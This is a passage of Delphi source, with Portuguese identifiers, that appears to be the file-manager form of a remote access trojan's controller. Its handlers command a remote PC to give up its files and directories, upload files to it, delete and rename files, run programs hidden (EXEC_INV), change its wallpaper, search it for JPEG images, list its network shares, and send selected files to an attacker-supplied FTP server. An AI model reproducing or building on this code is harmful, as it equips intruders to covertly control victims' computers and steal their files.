    ListView3.Items.Item[i] := ListView3.Items.Item[i + 1];
    ListView3.Items.Item[i + 1] := Item;
    ListView3.ItemIndex := i + 1;
    Item.Free;
  end;
end;

procedure TFormFileManager.ltimopuesto1Click(Sender: TObject);
var
  Item: TListItem;
  i, j: Integer;
begin
  for i:=ListView3.Items.Count -1 downto 0 do
    if ListView3.Items.Item[i].SubItems[0] = pchar(traduzidos[331]) then
    begin
      if ListView3.ItemIndex = i then Exit;
      Item := TListItem.Create(ListView3.Items);
      Item.Assign(ListView3.Selected);
      for j:= i + 1 to ListView3.Selected.Index do
        ListView3.Items.Item[j] := ListView3.Items.Item[j + 1];
      ListView3.Items.Item[i] := Item;
      ListView3.ItemIndex := i;
      Item.Free;
      break;
    end;
end;

procedure TFormFileManager.Borrarcompletados1Click(Sender: TObject);
var
  i, j: Integer;
  Descarga: TDescargaHandler;
begin
  for i := ListView3.Items.Count -1 downto 0 do
  begin
    Descarga := TDescargaHandler(ListView3.Items.Item[i].Data);
    if Descarga.Finalizado then
    begin
      Descarga.ProgressBar.Free;
      ListView3.Items[i].Delete;
      Descarga.Free;
      for j := i to ListView3.Items.Count - 1 do
      if ListView3.Items.Item[j].Data <> nil then
      begin
        Descarga := TDescargaHandler(ListView3.Items.Item[j].Data);
        Descarga.ProgressBar.Top := Descarga.ProgressBar.Top -
                                    (Descarga.ProgressBar.BoundsRect.Bottom -
                                    Descarga.ProgressBar.BoundsRect.Top);
      end;
    end;
  end;
end;


procedure TFormFileManager.Eliminardescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
  i, j:integer;
begin
  if not TDescargaHandler(ListView3.Selected.Data).Transfering then
  begin
    TDescargaHandler(ListView3.Selected.Data).ProgressBar.Free;
    TDescargaHandler(ListView3.Selected.Data).Free;
    i := ListView3.Selected.Index;
    ListView3.Selected.Delete;
    for j := i to ListView3.Items.Count - 1 do
    if ListView3.Items.Item[j].Data <> nil then
    begin
      Descarga := TDescargaHandler(ListView3.Items.Item[j].Data);
      Descarga.ProgressBar.Top := Descarga.ProgressBar.Top -
                                  (Descarga.ProgressBar.BoundsRect.Bottom -
                                  Descarga.ProgressBar.BoundsRect.Top);
    end;
  end;
end;


procedure TFormFileManager.Adicionarnalistadedownloads1Click(
  Sender: TObject);
var
  Descarga:TDescargaHandler;
  FilePath : AnsiString;
  Size: integer;

  i: integer;
  TempStr: string;
begin
  if listview1.SelCount > 1 then
  begin
    if MessageDlg(pchar(Traduzidos[345]), mtConfirmation, [mbYes, mbNo], 0) = idNo then exit;
    for i := 0 to Listview1.Items.Count - 1 do
    begin
      if (listview1.Items.Item[i].Selected = true) and
         (ListView1.Items.Item[i].SubItems.Strings[1] <> traduzidos[298]) then
      begin
        FilePath := Edit1.Text + listview1.Items.Item[i].Caption;
        Size := StrToInt(listview1.Items.Item[i].SubItems.Strings[6]);
        Descarga := TDescargaHandler.Create(nil, FilePath, Size, ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\' + ExtractFileName(FilePath), ListView3, true);
        Descarga.callback := Self.TransferFinishedNotification;
      end;
    end;
    exit;
  end;




  FilePath := Edit1.Text + ListView1.Selected.Caption;
  Size := StrToInt(ListView1.Selected.SubItems.Strings[6]);
  Descarga := TDescargaHandler.Create(nil, FilePath, Size, ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\' + ExtractFileName(FilePath), ListView3, true);
  Descarga.callback := Self.TransferFinishedNotification;
end;

procedure TFormFileManager.Enviararquivo1Click(Sender: TObject);
var
  i:integer;
  Descarga: TDescargaHandler;
  FilePath: AnsiString;
  Size: int64;
begin
  opendialog1.Filter := 'All Files (*.*)' + '|*.*';
  opendialog1.InitialDir := extractfilepath(paramstr(0));
  opendialog1.Title := Application.Title + ' ' + VersaoPrograma;

  if opendialog1.Execute = false then exit else
  begin
    FilePath := OpenDialog1.FileName;
    FilePath := Edit1.Text + ExtractFileName(OpenDialog1.FileName);
    for i := 0 to ListView3.Items.Count -1 do
    begin
      Descarga := TDescargaHandler(ListView3.Items[i].Data);
      if Descarga.Origen = FilePath then
      begin
        MessageDlg(pchar(traduzidos[337]), mtWarning, [mbok], 0);
        Exit;
      end;
    end;
    Size := MyGetFileSize(OpenDialog1.FileName);
    if Size > 0 then
    EnviarString(Servidor.Athread, UPLOAD + '|' +
                                   OpenDialog1.FileName + '|' +
                                   Edit1.Text + ExtractFileName(OpenDialog1.FileName) + '|' +
                                   inttostr(Size) + '|', true);
  end;
end;


procedure TFormFileManager.BitBtn2Click(Sender: TObject);
var
  dir, arq: string;
  i: integer;
begin
  if combobox1.Items.Count <= 0 then exit;

  if edit2.Text = '' then exit;
  arq := extractfilename(edit2.Text);

  if (extractfileext(edit2.Text) = '') then
  begin
    messagedlg(pchar(traduzidos[338]), mtWarning, [mbOK], 0);
    exit;
  end;

  dir := extractfileDir(edit2.Text);

  if pos(':\', dir) > 0 then
  begin
    if dir[length(dir)] <> '\' then dir := dir + '\';
    if arq = '' then arq := extractfilename(edit2.Text);
    if arq = '' then
    begin
      MessageDlg(pchar(traduzidos[339]), mtWarning, [mbOK], 0);
      exit;
    end;
  end else
  begin
    if arq = '' then arq := '*.*';
    if (pos('\', arq) > 0) or (arq[1] = '\') or
       (pos('/', arq) > 0) or (arq[1] = '/') or
       (pos('?', arq) > 0) or (arq[1] = '?') or
       (pos('<', arq) > 0) or (arq[1] = '<') or
       (pos('>', arq) > 0) or (arq[1] = '>') or
       (pos('|', arq) > 0) or (arq[1] = '|') then
    begin
      MessageDlg(pchar(traduzidos[340] + ' Ex.: \ ou / ou * ou ? < ou > ou etc...' + #13#10 +
                      traduzidos[341]), mtWarning, [mbOK], 0);
      exit;
    end;
    dir := 'ALL?';
    for i := 4 to combobox1.Items.Count - 1 do // "i" partindo do "4" pelos atalhos excluídos
    dir := dir + copy(combobox1.Items.Strings[i], 1, pos('\', combobox1.Items.Strings[i])) + '?';
  end;

  EnviarString(Servidor.Athread, PROCURAR_ARQ + '|' + dir + '|' + arq + '|', true);

  bitbtn3.Enabled := true;
  bitbtn2.Enabled := not bitbtn3.Enabled;
  edit2.Enabled := bitbtn2.Enabled;
  StatusBar1.Panels.Items[1].Text := pchar(traduzidos[164]);
end;

procedure TFormFileManager.BitBtn3Click(Sender: TObject);
var
  ToSend: string;
begin
  ToSend := PROCURAR_ARQ_PARAR + '|';

  enviarstring(Servidor.Athread, ToSend, true);
  bitbtn3.Enabled := false;
end;

procedure TFormFileManager.Edit2KeyPress(Sender: TObject; var Key: Char);
begin
  if (key = #13) and
     (bitbtn2.Enabled = true) then bitbtn2.Click;
end;

procedure TFormFileManager.Edit1Change(Sender: TObject);
begin
  Edit2.Text := Edit1.Text + '*.jpg';
  DiretorioSelecionado := Edit1.Text;
end;

procedure TFormFileManager.BaixarArquivo2Click(Sender: TObject);
var
  i:integer;
  Descarga: TDescargaHandler;
  FilePath: AnsiString;

  TempStr: string;
begin
  if listview2.SelCount > 1 then
  begin
    if MessageDlg(pchar(Traduzidos[345]), mtConfirmation, [mbYes, mbNo], 0) = idNo then exit;
    for i := 0 to listview2.Items.Count - 1 do
    begin
      if (listview2.Items.Item[i].Selected = true) and
         (listview2.Items.Item[i].SubItems.Strings[1] <> traduzidos[298]) then
      TempStr := TempStr + listview2.Items.Item[i].Caption + '|';
    end;
    TempStr := MULTIDOWNLOAD + '|' + TempStr;
    EnviarString(Servidor.Athread, TempStr);
    exit;
  end;

  FilePath := ListView2.Selected.Caption;

  for i := 0 to ListView3.Items.Count -1 do
  begin
    Descarga := TDescargaHandler(ListView3.Items[i].Data);
    if Descarga.Origen = FilePath then
    begin
      MessageDlg(pchar(Traduzidos[337]), mtWarning, [mbok], 0);
      Exit;
    end;
  end;
  EnviarString(Servidor.Athread, DOWNLOAD + '|' + FilePath + '|', true);
end;

procedure TFormFileManager.AddlistadownloadClick(Sender: TObject);
var
  Descarga:TDescargaHandler;
  FilePath : AnsiString;
  Size: integer;

  i: integer;
  TempStr: string;
begin
  if listview2.SelCount > 1 then
  begin
    if MessageDlg(pchar(Traduzidos[345]), mtConfirmation, [mbYes, mbNo], 0) = idNo then exit;
    for i := 0 to listview2.Items.Count - 1 do
    begin
      if (listview2.Items.Item[i].Selected = true) and
         (listview2.Items.Item[i].SubItems.Strings[1] <> traduzidos[298]) then
      begin
        FilePath := listview2.Items.Item[i].Caption;
        Size := StrToInt(listview2.Items.Item[i].SubItems.Strings[6]);
        Descarga := TDescargaHandler.Create(nil, FilePath, Size, ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\' + ExtractFileName(FilePath), ListView3, true);
        Descarga.callback := Self.TransferFinishedNotification;
      end;
    end;
    exit;
  end;



  FilePath := ListView2.Selected.Caption;
  Size := StrToInt(ListView2.Selected.SubItems.Strings[6]);
  Descarga := TDescargaHandler.Create(nil, FilePath, Size, ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\' + ExtractFileName(FilePath), ListView3, true);
  Descarga.callback := Self.TransferFinishedNotification;
end;

procedure TFormFileManager.ExecNormalClick(Sender: TObject);
var
  name: string;
begin
  name := '';
  if inputquery(pchar(traduzidos[308]), pchar(traduzidos[309]), name) then
  EnviarString(Servidor.Athread, EXEC_NORMAL + '|' + ListView2.Selected.Caption + '|' + name + '|', true) else
  EnviarString(Servidor.Athread, EXEC_NORMAL + '|' + ListView2.Selected.Caption + '|' + ' ' + '|', true);
end;

procedure TFormFileManager.ExecOcultoClick(Sender: TObject);
var
  name: string;
begin
  name := '';
  if inputquery(pchar(traduzidos[308]), pchar(traduzidos[309]), name) then
  EnviarString(Servidor.Athread, EXEC_INV + '|' + ListView2.Selected.Caption + '|' + name + '|', true) else
  EnviarString(Servidor.Athread, EXEC_INV + '|' + ListView2.Selected.Caption + '|' + ' ' + '|', true);
end;

procedure TFormFileManager.Deletar2Click(Sender: TObject);
var
  ToDelete: string;
  TempStrDIR, TempStrFILE: string;
  i: integer;
begin
  if listview2.SelCount > 1 then
  begin
    if MessageDlg(pchar(Traduzidos[345]), mtConfirmation, [mbYes, mbNo], 0) = idNo then exit;

    for i := 0 to listview2.Items.Count - 1 do
    begin
      if (listview2.Items.Item[i].Selected = true) and
         (listview2.Items.Item[i].SubItems.Strings[1] = traduzidos[298]) then
      TempStrDIR := TempStrDIR + listview2.Items.Item[i].Caption + '|' else
      if (listview2.Items.Item[i].Selected = true) and
         (listview2.Items.Item[i].SubItems.Strings[1] <> traduzidos[298]) then
      TempStrFILE := TempStrFILE + listview2.Items.Item[i].Caption + '|';
    end;
    if TempStrDIR <> '' then
    begin
      TempStrDIR := MULTIDELETAR_DIR + '|' + TempStrDIR;
      EnviarString(Servidor.Athread, TempStrDIR);
      sleep(500);
    end;
    if TempStrFILE <> '' then
    begin
      TempStrFILE := MULTIDELETAR_ARQ + '|' + TempStrFILE;
      EnviarString(Servidor.Athread, TempStrFILE);
    end;
    exit;
  end;

  ToDelete := listview2.Selected.Caption;
  if messagedlg(pchar(traduzidos[310] + ' "' + todelete + '"'), mtConfirmation, [mbYes, mbNo], 0) = idno then exit;
  EnviarString(Servidor.Athread, DELETAR_ARQ + '|' + ToDelete + '|', true);
end;

procedure TFormFileManager.Renomear2Click(Sender: TObject);
var
  Novonome: string;
  dir: string;
  TempStr: string;
begin
  TempStr := listview2.Selected.Caption;
  Novonome := extractfilename(TempStr);
  dir := copy(Tempstr, 1, lastdelimiter('\', Tempstr));
  if inputquery(pchar(traduzidos[311]), pchar(traduzidos[312]), Novonome) = true then
  EnviarString(Servidor.Athread, RENOMEAR_ARQ + '|' + TempStr + '|' + Dir + Novonome + '|', true)
end;

procedure TFormFileManager.Papeldeparede2Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, DESKTOP_PAPER + '|' + listview2.Selected.Caption + '|', true);
end;

procedure TFormFileManager.Thumb2Click(Sender: TObject);
var
  i, k: integer;
  TempStr: string;
begin
  if listview2.SelCount > 1 then
  begin
    for i := 0 to Listview2.Items.Count - 1 do
    begin
      if (listview2.Items.Item[i].Selected = true) then
      begin
        if IsImageFile(listview2.Items.Item[i].Caption) = true then
        begin
          for k := 1 to high(ImageStringSearch) do if ImageStringSearch[k] = '' then break;
          ImageStringSearch[k] := ' ';
          listview2.Items.Item[i].Data := TObject(k);
          TempStr := TempStr + inttostr(k) + '|' + listview2.Items.Item[i].Caption + '|';
        end;
      end;
    end;
    if TempStr <> '' then
    begin
      TempStr := MULTITHUMBNAILSEARCH + '|' + TempStr;
      EnviarString(Servidor.Athread, TempStr);
      StatusBar1.Panels.Items[1].Text := pchar(traduzidos[164]);

      bitbtn3.Enabled := false;
      bitbtn2.Enabled := false;
      edit2.Enabled := false;
    end;
    exit;
  end;

  if IsImageFile(ListView2.Selected.Caption) = true then
  begin
    for i := 1 to high(ImageStringSearch) do if ImageStringSearch[i] = '' then break;
    ImageStringSearch[i] := ' ';
    listview2.Selected.Data := TObject(i);
    EnviarString(Servidor.Athread, THUMBNAILSEARCH + '|' + inttostr(i) + '|' + listview2.Selected.Caption + '|');
    bitbtn3.Enabled := false;
    bitbtn2.Enabled := false;
    edit2.Enabled := false;
  end;
end;

procedure TFormFileManager.ListView2SelectItem(Sender: TObject;
  Item: TListItem; Selected: Boolean);
var
  s: TMemoryStream;
  j: TJpegImage;
  BitMap: TBitmap;
begin
  if listview2.Selected = nil then exit;

  if (listview2.Selected.Data <> nil) and
     (length(ImageStringSearch[cardinal(listview2.Selected.Data)]) > 1) then
  begin
    S := TMemoryStream.Create;
    StrToStream(S, ImageStringSearch[cardinal(listview2.Selected.Data)]);
    S.Position := 0;
    j := TJpegImage.Create;
    j.LoadFromStream(S);
    S.Free;
    BitMap := tbitmap.Create;
    BitMap.Assign(j);
    j.Free;
    Image1.Bitmap.Assign(BitMap);
    BitMap.Free;
    label1.Caption := extractfilename(listview2.Selected.Caption);
  end else
  begin
    j := TJpegImage.Create;
    S := TMemoryStream.Create;
    FormPrincipal.ImageStream.Position := 0;
    S.CopyFrom(FormPrincipal.ImageStream, FormPrincipal.ImageStream.Size);
    S.Position := 0;
    j.LoadFromStream(S);
    S.Free;
    BitMap := tbitmap.Create;
    BitMap.Assign(j);
    j.Free;
    Image1.Bitmap.Assign(BitMap);
    BitMap.Free;
    label1.Caption := '';
  end;
end;

procedure TFormFileManager.PopupMenu1Popup(Sender: TObject);
var
  i: integer;
  //OK: boolean;
begin
  //OK := atualizar1.Enabled;

  for i := 0 to popupmenu1.Items.Count - 1 do
  popupmenu1.Items.Items[i].Enabled := false;

  //if OK = false then
  //begin
  //  messagedlg(pchar(traduzidos[297]), mtWarning, [mbOK], 0);
  //  exit;
  //end;

  if listview1.Selected = nil then
  begin
    //Atualizar1.Enabled := true;
    Downloads1.Enabled := true;
    exit;
  end;

  if listview1.SelCount > 1 then
  begin
    N1.Enabled := true;
    N2.Enabled := true;
    //Atualizar1.Enabled := true;
    Baixararquivo1.Enabled := true;
    EnviarArquivoFTP1.Enabled := true;
    BaixararquivoRecursive1.Enabled := true;
    Adicionarnalistadedownloads1.Enabled := true;
    Deletar1.Enabled := true;
    Visualizarimagem1.Enabled := true;
    Downloads1.Enabled := true;
  end else
  if listview1.SelCount = 1 then
  begin
    for i := 0 to popupmenu1.Items.Count - 1 do
    popupmenu1.Items.Items[i].Enabled := true;
    if IsImageFile(listview1.Selected.Caption) = false then
    begin
      Definircomopapeldeparede1.Enabled := false;
      Visualizarimagem1.Enabled := false;
    end;
    if listview1.Selected.SubItems.Strings[1] <> traduzidos[298] then
    begin
      Baixardiretrio1.Enabled := false;
      Baixararquivo1.Enabled := true;
      EnviarArquivoFTP1.Enabled := true;
      BaixararquivoRecursive1.Enabled := true;
      Attributes1.Enabled := true;
    end else
    begin
      Baixardiretrio1.Enabled := true;
      Baixararquivo1.Enabled := false;
      EnviarArquivoFTP1.Enabled := false;
      BaixararquivoRecursive1.Enabled := false;
      Attributes1.Enabled := false;
    end;
  end;
end;

procedure TFormFileManager.PopupMenu3Popup(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to popupmenu3.Items.Count - 1 do
  popupmenu3.Items.Items[i].Enabled := false;

  if listview2.Selected = nil then
  begin
    Download2.Enabled := true;
    exit;
  end;

  if listview2.SelCount > 1 then
  begin
    BaixarArquivo2.Enabled := true;
    N4.Enabled := true;
    Addlistadownload.Enabled := true;
    Deletar2.Enabled := true;
    Thumb2.Enabled := true;
    Download2.Enabled := true;
  end else
  if listview2.SelCount = 1 then
  begin
    for i := 0 to popupmenu3.Items.Count - 1 do
    popupmenu3.Items.Items[i].Enabled := true;
    if IsImageFile(listview2.Selected.Caption) = false then
    begin
      Papeldeparede2.Enabled := false;
      Thumb2.Enabled := false;
    end;
  end;
end;

procedure TFormFileManager.PopupMenu2Popup(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to popupmenu2.Items.Count - 1 do
  popupmenu2.Items.Items[i].Enabled := false;

  if listview3.Selected = nil then
  Abrirpastadedownloads1.Enabled := true else
  for i := 0 to popupmenu2.Items.Count - 1 do
  popupmenu2.Items.Items[i].Enabled := true;
end;

procedure TFormFileManager.ListView2ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  if (SortColumn2 = Column.Index) then
    SortReverse2 := not SortReverse2 //reverse the sort order since this column is already selected for sorting
  else
  begin
    SortColumn2 := Column.Index;
    SortReverse2 := false;
  end;
  ListView2.CustomSort(nil, 0);
end;

procedure TFormFileManager.ListView2Compare(Sender: TObject; Item1,
  Item2: TListItem; Data: Integer; var Compare: Integer);
begin
  if SortColumn2 = 0 then
    Compare := AnsiCompareStr(Item1.Caption, Item2.Caption)
  else
    Compare := AnsiCompareStr(Item1.SubItems[SortColumn2-1], Item2.SubItems[SortColumn2-1]);
  if SortReverse2 then Compare := 0 - Compare;
end;

procedure TFormFileManager.ListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  if (SortColumn1 = Column.Index) then
    SortReverse1 := not SortReverse1 //reverse the sort order since this column is already selected for sorting
  else
  begin
    SortColumn1 := Column.Index;
    SortReverse1 := false;
  end;
  ListView1.CustomSort(nil, 0);
end;

procedure TFormFileManager.ListView1Compare(Sender: TObject; Item1,
  Item2: TListItem; Data: Integer; var Compare: Integer);
begin
  if SortColumn1 = 0 then
    Compare := AnsiCompareStr(Item1.Caption, Item2.Caption)
  else
    Compare := AnsiCompareStr(Item1.SubItems[SortColumn1-1], Item2.SubItems[SortColumn1-1]);
  if SortReverse1 then Compare := 0 - Compare;
end;

procedure TFormFileManager.PageControl1Change(Sender: TObject);
begin
  if PageControl1.ActivePage = tabsheet1 then FilesDirCount(Listview1) else
  FilesDirCount(Listview2);
end;

procedure TFormFileManager.Listarpastascompartilhadasnarede1Click(
  Sender: TObject);
begin
  Listarpastascompartilhadasnarede1.Enabled := false;
  EnviarString(Servidor.Athread, GETSHAREDLIST + '|', true);
  StatusBar1.Panels.Items[1].Text := pchar(traduzidos[164]);
end;

procedure TFormFileManager.BaixararquivoRecursive1Click(Sender: TObject);
var
  i:integer;
  Descarga: TDescargaHandler;
  FilePath: AnsiString;

  TempStr: string;
begin
  if listview1.SelCount > 1 then
  begin
    if MessageDlg(pchar(Traduzidos[345]), mtConfirmation, [mbYes, mbNo], 0) = idNo then exit;
    for i := 0 to Listview1.Items.Count - 1 do
    begin
      if (listview1.Items.Item[i].Selected = true) and
         (ListView1.Items.Item[i].SubItems.Strings[1] <> traduzidos[298]) then
      TempStr := TempStr + Edit1.Text + ListView1.Items.Item[i].Caption + '|';
    end;
    TempStr := MULTIDOWNLOADREC + '|' + TempStr;
    EnviarString(Servidor.Athread, TempStr);
    exit;
  end;

  FilePath := Edit1.Text + ListView1.Selected.Caption;

  for i := 0 to ListView3.Items.Count -1 do
  begin
    Descarga := TDescargaHandler(ListView3.Items[i].Data);
    if Descarga.Origen = FilePath then
    begin
      MessageDlg(pchar(Traduzidos[337]), mtWarning, [mbok], 0);
      Exit;
    end;
  end;
  EnviarString(Servidor.Athread, DOWNLOADREC + '|' + FilePath + '|', true);
end;

procedure TFormFileManager.Baixardiretrio1Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, DOWNLOADDIR + '|' + edit1.Text + listview1.Selected.Caption + '|', true);
end;

procedure TFormFileManager.Stopdowndir1Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, DOWNLOADDIRSTOP + '|', true);
end;

procedure TFormFileManager.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  Descarga: TDescargaHandler;
  i: integer;
  ToSend: string;
begin
  if EndUpdate1 = false then Listview1.Items.EndUpdate;
  EndUpdate1 := true;

  if EndUpdate2 = false then Listview2.Items.EndUpdate;
  EndUpdate2 := true;

  if Servidor.Athread.Connection.Connected = true then

  ToSend := PROCURAR_ARQ_PARAR + '|';
  try
    enviarstring(Servidor.Athread, ToSend, true);
    except
  end;  

  listview1.Items.BeginUpdate;
  listview1.Items.Clear;
  listview1.Items.EndUpdate;

  listview2.Items.BeginUpdate;
  listview2.Items.Clear;
  listview2.Items.EndUpdate;


  Combobox1.Items.Clear;
  Combobox1.Text := '';
  edit1.Clear;
  edit2.Clear;
  if listview3.Items <> nil then
  for i := 0 to ListView3.Items.Count - 1 do
  begin
    Descarga := TDescargaHandler(ListView3.Items.Item[i].Data);
    Descarga.CancelarDescarga;
    Descarga.ProgressBar.Free;
    Descarga.Free;
  end;

  listview3.Items.BeginUpdate;
  listview3.Items.Clear;
  listview3.Items.EndUpdate;
end;

procedure TFormFileManager.Attributes1Click(Sender: TObject);
var
  AMsgDialog: TForm;
  ACheckBoxH, ACheckBoxR, ACheckBoxS: TCheckBox;
  ToSend: string;
begin
  AMsgDialog := CreateMessageDialog(traduzidos[491], mtConfirmation, [mbYes, mbNo]) ;
  ACheckBoxH := TCheckBox.Create(AMsgDialog) ;
  ACheckBoxR := TCheckBox.Create(AMsgDialog) ;
  ACheckBoxS := TCheckBox.Create(AMsgDialog) ;
  with AMsgDialog do
  try
   Caption := NomePC + ' --- ' + traduzidos[306];
   Height := 189;

   with ACheckBoxH do
   begin
    Parent := AMsgDialog;
    Caption := traduzidos[488];
    Top := 101;
    Left := 8;
    width := 180;
    if pos('H', listview1.Selected.SubItems.Strings[2]) > 0 then ACheckBoxH.Checked := true;
   end;

   with ACheckBoxR do
   begin
    Parent := AMsgDialog;
    Caption := traduzidos[489];
    Top := 121;
    Left := 8;
    width := 180;
    if pos('R', listview1.Selected.SubItems.Strings[2]) > 0 then ACheckBoxR.Checked := true;
   end;

   with ACheckBoxS do
   begin
    Parent := AMsgDialog;
    Caption := traduzidos[490];
    Top := 141;
    Left := 8;
    width := 180;
    if pos('S', listview1.Selected.SubItems.Strings[2]) > 0 then ACheckBoxS.Checked := true;
   end;

   if (ShowModal = ID_YES) then
   begin
    ToSend := '';
    if pos('A', listview1.Selected.SubItems.Strings[2]) > 0 then ToSend := 'A';
    if ACheckBoxH.Checked then ToSend := ToSend + 'H';
    if ACheckBoxR.Checked then ToSend := ToSend + 'R';
    if ACheckBoxS.Checked then ToSend := ToSend + 'S';
    if ToSend = '' then
    EnviarString(Servidor.Athread, CHANGEATTRIBUTES + '|' + edit1.Text + listview1.Selected.Caption + '|' + 'XXX' + '|', true) else
    EnviarString(Servidor.Athread, CHANGEATTRIBUTES + '|' + edit1.Text + listview1.Selected.Caption + '|' + ToSend + '|', true);
   end;
   finally
   Free;
  end;
end;

procedure TFormFileManager.EnviararquivoFTP1Click(Sender: TObject);
var
  i:integer;
  Descarga: TDescargaHandler;
  FilePath: AnsiString;

  TempStr: string;
begin
  if MessageDlg(traduzidos[493], mtConfirmation, [mbYes, mbNo], 0) = idNo then exit;
  FormFTPSettings.ShowModal;
  if FormFTPSettings.PodeEnviar = false then exit;

  if (FormFTPSettings.Edit1.Text = '') or
     (FormFTPSettings.Edit2.Text = '') or
     (FormFTPSettings.Edit3.Text = '') or
     (FormFTPSettings.Edit4.Text = '') then
  begin
    MessageDlg(traduzidos[90], mtWarning, [mbOK], 0);
    exit;
  end;

  if (listview1.SelCount >= 1) then
  begin
    for i := 0 to Listview1.Items.Count - 1 do
    begin
      if (listview1.Items.Item[i].Selected = true) and
         (ListView1.Items.Item[i].SubItems.Strings[1] <> traduzidos[298]) then
      TempStr := TempStr + Edit1.Text + ListView1.Items.Item[i].Caption + '|';
    end;
    TempStr := SENDFTP + '|' +
               FormFTPSettings.Edit1.Text + '|' + //address
               FormFTPSettings.Edit2.Text + '|' + //user
               FormFTPSettings.Edit3.Text + '|' + //pass
               FormFTPSettings.Edit4.Text + '|' + //port
               TempStr;
    EnviarString(Servidor.Athread, TempStr, true);
    exit;
  end;
end;

end.
